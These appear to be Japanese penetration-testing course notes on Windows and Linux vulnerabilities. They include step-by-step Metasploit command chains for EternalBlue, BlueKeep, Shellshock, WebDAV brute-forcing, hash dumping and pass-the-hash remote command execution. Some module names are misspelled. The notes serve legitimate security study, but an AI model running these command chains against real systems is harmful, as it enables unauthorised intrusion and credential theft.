脆弱性

windowsの脆弱性の概要
・基本的に古いOSのバージョンが残っていると、それが脆弱性になる。
・開発モデルと哲学を考慮すると、すべてのWindowsのOSはは類似性を有している。
例えば）
　１）windows OSは、C言語で開発されているため、バッファーオーバーフローや任意のコードの実行の脆弱性がある。
　2) デフォルトでは、Windowsは安全に実行するように構成されていないため、Windowsを安全に実行するように構成するには、セキュリティ対策の予防的な措置が必要
　3) 新たに発見された脆弱性は、マイクロソフトに直ぐには、修正されず、Windowsの断片化された性質を考えると多くのシステムは修正されないまま残される。

・Windowsの最大の問題点は、断片化である

・Windowsの新バージョンが頻繁にリリースされることも悪用される要因の1つ。
・Windowsは、固有の脆弱性に加えて、sqlインジェクション攻撃などのクロスクロスプラットフォームの脆弱性にも脆弱
・Windowsを実行してシステムやホストは、盗難,悪意のある周辺機器などの物理的な攻撃に対しても脆弱。

・Windowsにおける脆弱性の種類
1) 情報開示：攻撃者が機密データにアクセスできるようにする脆弱性
2) バッファーオーバーフロー：プログラミングエラーによって発生し、攻撃者がバッファーに書き込み、割り当てられたバッファーをオーバーランさせ、結果として割り当てられたメモリアドレスにデータを書き込むことを可能にした。
3) リモートコードの実行：脆弱性により、攻撃者がリモートから標的にシステム上でコードを実行できる。
4) 権限昇格：脆弱性により、攻撃者はシステムの初期攻撃後に権限を昇格することができる。
5) サービス拒否(DOS)：脆弱性により攻撃者は、システムやホストのリソースを消費し、結果としてシステムが正常に機能しなくなる可能性がある。

quiz
・悪意のあるコードの実行に直接関係しないものは、情報開示
・エンドポイント保護はWindowsセキュリティにおいて、セキュリティの脆弱性を軽減する。

頻繁に悪用されるwindowsサービス
・Windowsには、ホスト上で実行するように構成できる様々なネイティブサービスとプロトコルがある。
・これらのサービスは、攻撃者にターゲットホストへのアクセスに利用できるアクセスベクトルを提供する。
・これらのサービスがどのようなものか、どのように機能するか、潜在的な脆弱性をがあるのかを十分に理解することは、侵入テスターとして持つべき非常に重要なスキルである。

・よく悪用されるWindowsサービス
protocol/service		    port		                    purpose				
Microsoft IIS		        TCP ports 80/443			　Microsoftが開発したWindows上で動作する独自のWebサーバーソフトウェア
インターネット情報サービス								  SSLが構成されている場合TCP80または443で実行されるネイティブWindowsサービスはIIS
WebDAV　　　　　　　　　　　　TCP port 80/443               クライアントがWebサーバー上のファイルを更新、削除、移動、コピーできるようにするHTTP拡張機能
　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　WebDAVはWebサーバーをファイルサーバーとして機能させるために使用される。
SMB/CIFS                    TCP port 445                  ローカルネットワーク内のコンピュータ間でファイルや周辺機器を共有するために使用されるネットワークファイルの共有プロトコル
RDP                         TCP port 3389                 Microsoftが開発した独自のGUIリモートアクセスプロトコル
　　　　　　　　　　　　　　　                               Windowsシステムにリモートで認証・操作するために使用される。
                                                          WindowsシステムでRDPサービスはデフォルトでは有効になっていない
WinRM                       TCP port 5986/443             Windowsシステムへのリモートアクセスを容易にするために使用されるWindowsリモート管理プロトコル

quiz
・WindowsシステムでRDPサービスがデフォルトでは有効になっていない。


Metasploitフレームワークを使用した脆弱性スキャン
・脆弱性スキャニングと検出は、対象をスキャンして脆弱性を確認して、それらが悪用可能かどうかを検証するプロセス。
・このセクションでは、補助モジュールやエクスプロイトモジュールを活用し、サービス、OS、Webアプリケーションに内在する脆弱性をスキャンして特定するプロセスを探る
→この情報は、攻撃フェーズに役立つ。

・プロセス
1)　どのホストが起動しているかどうかを確認する 
sudo nmap -sn IP address/subnet
2) ip a s
3) msfconsole
4) データベースステータスを入力して、データベースが接続されていることを確認する
db_status
5) setg RHOSTS IP address
6) setg RHOST IP address
7) workspace -a MS3
8) db_nmap -sS -sV -O IP address
9) hosts
10) services
11) search type:exploit name:Microsoft IIS
12) search type:exploit name:MySQL 5.5
13) search Sun GlassFish
14) use exploit/multi/http/glassfish_deployer
15) info
16) set payload windows/meterpreter/reverse_tcp
17) show options
18) services
19) back
20) services
21) searchsploit "Microsoft Windows SMB"
22) searchsploit "Microsoft Windows SMB" | grep -e "metasploit"
23) search eternalblue
24) use suxiliary/scanner/smb/smb_ms17_010
25) show options
26) run
27) use exploit/windows/smb_ms17_010_eternalblue
28) show options
29) run
30) sysinfo
31) exit
32) back
実際にターゲットシステムで現在開いているポートのエクスプロイトモジュールは、metasploit-autopwnを使用する。
ターゲットシステムで現在開いているポートのエクスプロイトモジュールで、これはデータベースとサービスを調べて、対象システム上で現在実行中または現在開いているものをスキャンしたファイルが表示され、エクスプロイトモジュールのリストが表示される。
33) cd Downloads
34) wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
35) ls
36) sudo mv db_autopwn.rb /usr/share/metasploit-framework/plugins
37) load db_autopwn
38) db_autopwn
39) db_autopwn -p -t
40) db_autopwn
41) db_autopwn -p -t -PI 445
42) analyze 

quiz
・


WebDAVの脆弱性
・IISは、windowsNTファミリ向けにMicrosoftが開発した独自の拡張可能なウェブサーバーソフトウェア
→ウェブサイトやウェブアプリをホストするために使用でき、サイト管理用の堅牢なGUIを管理者に提供する。
→asp.netやphpで開発された静的ページ/動的ページの両方をホストできる。
→サポートされる実行可能ファイル拡張子（例：.asp,.aspx,.config,.php）

・WebDAVは、HTTPプロトコルの拡張であり、ユーザーがリモートのウェブサーバー上でファイルを共同編集・管理できるようにする。
→webdavは基本的にウェブサーバーをファイルサーバーとして機能させ、共同編集を可能にする
→webdavはIIS上で動作し、ポート80/443で提供する。
→webdavにログインするためには認証情報が必要

・webdavを悪用するステップ
1) IISウェブサーバー上でwebdavが設定されているかどうかの確認
2) 認証情報を得るためにブルートフォースを行い、認証情報を得る。
3) webdavサーバーに認証して悪意のある.aspペイロードをアップロードし、任意のコマンドを実行したりターゲット上でリバースシェルを取得する。

・ここで使用するツールは、「davtest」と「cadaver」である
1) davtest
・webdavサーバーをスキャン、認証、検査するためのツール
・kaliやparrotOSなど多くの攻撃系ペンテス配布用にインストールされている

2) cadaver
・認証を可能にするコマンド
・ファイルのアップロード/ダウンロード、画面表示、インプレース編集、移動、コピー、コレクションの削除・作成、プロパティ操作、リソースロック、webサーバー上での各種操作をサポートするクライアント
・こちらもkaliやparrotOSではインストールされていることが多い

・プロセス
1) nmap -sV -sC targetIPアドレス
＊-sC：--script=default
2) nmap -sV -p 80 --script=http-enum targetIPアドレス
3) ブラウザにターゲットIPを貼り付ける
4) ブルートフォース攻撃
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt ターゲットIPアドレス http-get /webdav/
5) davtest -url http://ターゲットIP/webdav
6) davtest -auth ユーザ名:password -url http://ターゲットIPアドレス/webdav
7) cadaver http://ターゲットIP/webdav
8) ls
9) ls -al /usr/share/webshells/asp/

windows MS17-010 smb脆弱性の悪用
・EternalBlue(MS17-010/CVE-2017-0144)は、攻撃者がリモートで任意のコードを実行し、windowsシステムにアクセスし、その結果ターゲットシステムにアクセスを得られるようにするwindowsの脆弱性とエクスプロイトの集合につけられた名前
・EternalBlueエクスプロイトは、MS-17-010の脆弱性を悪用するためにNSAによって開発された。
・EternalBlueエクスプロイトは、攻撃者が特別に細工したパケットを送信することを可能にするwindowsのsmbv1プロトコルの脆弱性を利用して、その結果任意のコマンド実行を容易にする。

・EternalBlueエクスプロイトは、2017.06.27に発生したwannacryランサムウェア攻撃で使用された。
→この攻撃は、できる限り多くのシステムにランサムウェアを拡散する目的で、ネットワークを介してwindowsシステムを悪用した

・EternalBlueエクスプロイトは、ターゲットシステムがこのエクスプロイトに対して脆弱かどうかを確認するために使用できるmsfの補助モジュールがあり、またパッチが適用されていないシステム上で脆弱性を悪用するためのエクスプロイトモジュールも存在する。
・EternalBlueエクスプロイトは、脆弱なwindowsシステムを悪用するために使用でき、その結果としてターゲットシステム上で権限のあるmeterpreterセッションを提供する。
・msfモジュール以外にも公開されているエクスプロイトコードを使って悪用可能。

demo
1) nmap -sV -p 445 -O IPアドレス
2) sudo nmap -sV -p 445 --script=smb-vuln-ms17-010 IPアドレス
3) ls -al

・EternalBlueエクスプロイトの実行の際には、最後にIPアドレスとshellcode/sc_x64.bin
・github autoblue-ms17-010も使用可能

windows cve 2019 070 8 RDP 脆弱性の悪用
・Bluekeep(cve-2019-0708)は、windowsのRDPに関する脆弱性につけられた名前で、攻撃者がリモートで任意のコードを実行し、windowsシステムにアクセスし、その結果ターゲットシステムにアクセスを得る可能性
・bluekeepの脆弱性は、2019年5月に公開
・bluekeepエクスプロイトは、windowsのrdpプロトコルの脆弱性を悪用し、攻撃者がカーネルメモリの一部にアクセスできるようにし、その結果認証なしにシステムレベルでリモートに任意のコードを実行できるようにする。

・microsoftは、2019.05.14にこの脆弱性のパッチをリリースし、企業に対してできるだけ、この脆弱性を修正するように求めた

・bluekeepのエクスプロイトにはmsfの補助モジュールがあり、ターゲットシステムがこのエクスプロイトに対して脆弱であるかどうかを確認するために使用
・bluekeepのエクスプロイトモジュールは、脆弱なwindowsシステムを攻撃できるように使用でき、その結果ターゲットシステム上で特権的なmeterpreterセッションを得る

demo
1) sudo nmap -p 3389 IPアドレス
2) msfconsole
3) search bluekeep
4) use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
5) show options
6) set RHOSTS IPアドレス
7) run
8) search bluekeep
9) use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
10) show options
11) set RHOSTS IPアドレス
12) exploit
13) show targets
14) set target 2
15) exploit
16) sysinfo
17) getuid

Pass-THE-HASH攻撃
・Pass-THE-hashは、ntlmハッシュまたは平文パスワードを取得または収集し、それらを利用してターゲットに正規の方法で認証するエクスプロイト手法
・Pass-the-hash攻撃を実行するためのツール
1) metasploitのpsexecモジュール
2) crackmapexec
→この手法は、サービスの脆弱性の悪用ではなく、正規の資格情報を用いてターゲットシステムにアクセスする。

demo
1) service postgresql start &&msfconsole
2) search badblue
3) use exploit/windows/http/badblue-passthruffer overflow
4) set RHOST IPアドレス
5) exploit
6) pgrep lsass
7) migrate 6)のresult
8) getuid
9) load kiwi
10) lsa_dump_sam
11) hash htlmをメモ
12) hashdump
13) search psexec
14) use exploit/windows/smb/psexec
15) show options
16) sessions
17) set LPORT 4422
18) set RHOSTS IPアドレス
19) set SMBUser Administrator
20) set SMBPass NTLMハッシュ
21) exploit
22) sessions
23) set target
24) set target Command
25) exploit
26) sessions
27) show options
28) set target
29) set target Native \ upload
30) exploit
31) sysinfo
32) getuid
33) exit
34) sessions
35) sessions exploit/windows/smb/psexec
36) show options
37) exploit
38) sysinfo
39) タブの入れ替え
40) crackmapexec smb IPアドレス  -u Administrator -p "NTLMハッシュ"
41) crackmapexec smb IPアドレス  -u Administrator -H "NTLMハッシュ"
42) crackmapexec smb IPアドレス  -u Administrator -H "NTLMハッシュ" -x "ipconfig"
43) crackmapexec smb IPアドレス  -u Administrator -H "NTLMハッシュ" -x "whoami"
44) crackmapexec smb IPアドレス  -u Administrator -H "NTLMハッシュ" -x "net user"


Linuxにおける脆弱性
・Linuxは無料でオープンソースのOSであり、LinuxカーネルとGNUツールキットで構成されている。
→このオープンソースソフトウェアの組み合わせが全体としてLinuxOSを形成しており、一般的に、GNU/Linuxと呼ばれる。
＊カーネル：OSの中心的なプログラムでハードウェアのリソースを管理し、アプリケーションの実行許可して、これらを仲介する。
・Linuxは、サーバー用のOSとして利用される。

・Linuxサービスでよく攻撃される例
プロトコル/サービス       port                     目的
apache/web server    tcp port 80/443     　　apache license 2.0の下で公開されている無料かつオープンソースのクロスプラットフォームウェブサーバ
　　　　　　　　　　　　　　　　　　　　　　　　 世界のウェブサーバーの80％以上がapacheを使用　
ssh                  tcp port 22             sshは暗号化されたリモートアクセスプロトコルで、セキュアではないネットワーク越しにシステムへのリモートアクセス・制御されるために利用される。
ftp                  tcp port 21             FTPはtcp port21を使用するプロトコルでサーバーとクライアント間またはクライアント同士間のファイル共有を容易にする。
SAMBA                tcp port 445            sambaはsmbのLinuxの実装で、WindowsシステムがLinux共有フォルダやデバイスへのアクセスを可能にする。

脆弱性の分析：Shell shock
・Shellshock（CVE-2014-6271）は、Bashシェルに存在する一連の脆弱性につけられた名前である。
これにより攻撃者は、Bashを通じて任意のリモートコマンドを実行でき、その結果リバースジェルを用いてターゲットシステムへのリモートアクセスを取得できる。
・Bashは、GNUプロジェクトの一部であるＵＮＩＸ系シェルであり、ほとんどのＬｉｎｕｘディストリビューションでデフォルトのシェルとして設定されている。

・shellshockの脆弱性は、Bashの欠陥によって発生する
→具体的には、Bashが（）｛；：｝；という文字列の後に続くコマンドを誤って実行してしまうことに起因する
・Windowsには、Ｂａｓｈを利用していないので、この脆弱性はLinuxのみに影響する
・CGIスクリプトは、ApacheによってLinuxシステム上で任意のコマンドで実行するために使われ、その結果がクライアントに返される。この仕組みが攻撃に利用できる。


・shellshockの脆弱性を悪用するには、bashでやり取りできる入力ベクトルやスクリプトを特定する必要がある。
・apacheウェブサーバーの文脈では、Ｗｅｂサーバー上でアクセス可能な正当なcgi scriptを利用できる。
→cgiスクリプトが実行されると、ウェブサーバーは新しいプロセスを起動し、そのcgiスクリプトをbashで実行する。
・この脆弱性は、手動でもmsfの攻撃モジュールを使っても自動的に悪用できる可能性がある。


デモンストレーション
1) terminalを起動する
2) ifconfigでIPを取得
3) nmap -sV IP address
4) IP addressをブラウザで検索
5) IP address/javascriptで得たもの
6) nmap -sV IP --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"
7) burp起動
8) nc -nvlp 1234
9) service postgresql start && msfconsole
10) search shellshock
11) use exploit module
12) show options 
13) foxpoxsyからIPアドレスの取得
14) set RHOSTS 13)で取得したIP
15) set TARGET /gettime.cgi
16)exploit
17) sysinfo

quiz
・shellshockの脆弱性を悪用するために一般的に変更されるHTTPヘッダーフィールドはユーザーエージェント
・shellshockの脆弱性によってリモートでの任意のコマンドの実行が可能
・shellshockの脆弱性につながるBashの特性は、具体的には、環境変数関数の宣言に誤りがある。
・shellshockの脆弱性をはっけんしたのは、ステファン・シャゼラスでは、2014年9月に公開した。

nessuseによる脆弱性スキャン
・nessusはtenableによって開発された独自の脆弱性スキャナー
・nessusを利用してターゲットシステムに対して脆弱性スキャンを実行でき、その後、nessusの結果をmsfにインポートして解析や悪用に利用できる
・nessusは脆弱性を特定するプロセスを自動化し、cveコードのような脆弱性に関する関連情報も提供してくれる
・nessus essentialsを使用することもでき、最大16IPまでスキャンが可能

インストール
1)　ホームページからkali版をインストール
2) directoryに移動
3) chmod +x Nessus-10.0.0-debian6_amd64.deb
4) sudo dpkg -i Nessus-10.0.0-debian6_amd64.deb

1) sudo systemctl start nessusd.service
2) sudo systemctl statu nessusd.service
3) nessusをウェブで検索
newscan/basic network scan
4) msfconsole
5) workspace -a MS3
6) db_import
7) db_import デイレクトリ名
8) hosts
9) services
10) vulns
11) services
12) vulns -p 445
13) vulns -p 80
14) search cve:2017 name:smb
15) search cve:2017 name:rdp
16) search MS12-020
17) search cve:2015 name:manage_engine_opmanager_rce
18) use exploit/windows/http/manageengine_connectionid_write
19) show options
20) set RHOSTS IPアドレス
21) run
22) sessions
23) sessions 1
24) exit
25) back
26) search cve:2019 name:rdp

quiz
・nessusでサービススキャン設定を構成することが重要な理由は、スキャンを必須サービスに限定する

wmapによるwebアプリケーションの脆弱性スキャン
・wmapは強力で機能豊富なWebアプリケーション脆弱性スキャナーであり、Webサーバーの列挙を自動化したり、webapplicationの脆弱性をスキャンする。
・wmapは、msfのプラグインとして利用可能で、msfに直接読み込むことができる。
・wmapは、msfと完全に統合されており、その結果としてmsfの内部からwebアプリの脆弱性スキャンを実行できる

demo
1) ifconfig
2) service postgresql start
3) msfconsole
4) workspace -a web_scanning
5) setg RHOSTS IPアドレス
6) load wmap
7) wmap_sites -a IPアドレス
8) wmap_targets -t http://IPアドレス
9) wmap_sites -l
10) wmap_targets -l
11) wmap_run -t
12) wmap_run -e
13) wmap_vulns -l
14) use auxiliary/scanner/http/option
15) show options
16) run
17) use auxiliary/scanner/http/http_put
18) show options
19) run
20) set PATH /data/
21) run
22) curl http://IPアドレス
23) set FILEDATA "Thia does work"
24) set FILENAME this_work.txt
25) run

quiz
・webサーバーでHTTP PUTメソッドを正しく構成することが重要な理由は、攻撃者が悪意のあるファイルをアップロードできないようにするため
・wmapのHTTP PUTモジュールは、ファイルのアップロードまたはリソース操作の脆弱性をテストする
・wmapは、websアプリケーションでsqlインジェクションの脆弱性の特定に役立つ



								
